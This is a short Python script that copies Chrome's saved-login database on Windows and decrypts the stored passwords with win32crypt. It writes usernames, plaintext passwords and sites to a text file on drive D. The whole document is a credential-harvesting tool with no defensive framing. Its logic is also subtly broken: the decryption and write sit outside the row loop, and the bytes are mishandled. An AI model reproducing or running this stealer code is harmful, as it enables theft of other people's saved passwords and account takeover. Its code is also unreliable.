import os, sys
import shutil
import sqlite3
import win32crypt
def getpass():

    outFile_path = os.path.join('d:chrome_login.txt')
    if os.path.exists(outFile_path):
        os.remove(outFile_path)


    db_file_path = os.path.join(os.environ['LOCALAPPDATA'],
                            r'Google\Chrome\User Data\Default\Login Data')
    tmp_file = os.path.join(os.path.dirname(sys.executable), 'tmp_tmp_tmp')
    if os.path.exists(tmp_file):
        os.remove(tmp_file)
    shutil.copyfile(db_file_path, tmp_file)    # In case file locked
    conn = sqlite3.connect(tmp_file)
    for row in conn.execute('select username_value, password_value, signon_realm from logins'):
        pwd =row[1]
        pwdHash = str(pwd)
    
    ret =  win32crypt.CryptUnprotectData(pwdHash, None, None, None, 0)
    
    with open(outFile_path, 'a+') as outFile:
        outFile.write('UserName: {0:<20} Password: {1:<20} Site: {2} \n\n'.format(
            row[0].encode('gbk'), ret[1].encode('gbk'), row[2].encode('gbk')) )
    conn.close()
    print ('All Chrome passwords saved to:\n' +  outFile_path)

    os.remove(tmp_file)# Remove temp file

getpass()